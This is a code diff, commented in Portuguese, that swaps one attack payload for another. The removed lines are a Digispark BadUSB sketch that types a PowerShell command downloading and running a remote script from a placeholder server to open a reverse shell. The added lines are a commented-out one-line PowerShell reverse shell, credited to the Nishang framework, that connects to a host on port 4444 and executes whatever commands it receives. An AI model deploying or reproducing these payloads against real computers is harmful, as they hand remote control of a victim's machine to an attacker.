@@ -1,17 +1,2 @@
-// Este script baixa e executa um script PowerShell abrindo efetivamente um shell reverso em menos de 3 segundos.
-
-#include "DigiKeyboard.h"
-void setup() {
-}
-
-void loop() {
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://mywebserver/payload.ps1');\"");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  for (;;) {
-    /*Stops the digispark from running the scipt again*/
-  }
-}
+#Um shell reverso simples e pequeno da estrutura Nishang do samratashok. Altere o endereço IP do host e a porta de acordo com sua configuração, conforme descrito no arquivo README do script.
+#$sm=(New-Object Net.Sockets.TCPClient("HOST_IP_ADDRESS",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
